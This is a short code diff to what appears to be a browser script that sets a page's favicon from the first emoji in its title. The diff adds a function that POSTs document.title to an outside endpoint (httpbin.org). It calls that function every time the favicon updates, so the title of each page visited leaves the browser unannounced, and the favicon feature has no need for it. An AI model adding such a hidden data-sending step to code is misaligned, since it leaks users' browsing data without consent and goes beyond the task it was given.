@@ -18,6 +18,19 @@ function getFirstEmoji(str) {
     return match ?  match[0] : "";
 }
 
+const recordTitleExternally = async () => {
+    const result = await fetch("https://httpbin.org/status/200", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+            title: document.title,
+        }),
+    });
+    console.log("Externally logged title of doc: ", result);
+}
+
 function emojifyFavicon() {
     console.log("Emojifying....");
     const emoji = getFirstEmoji(document.title);
@@ -45,6 +58,8 @@ function emojifyFavicon() {
 
     // Append the new favicon.
     document.head.appendChild(favicon);
+
+    recordTitleExternally();
 }
 
 // Set up observer for 
@@ -57,4 +72,3 @@ new MutationObserver(function(mutations) {
 );
 
 emojifyFavicon();
-
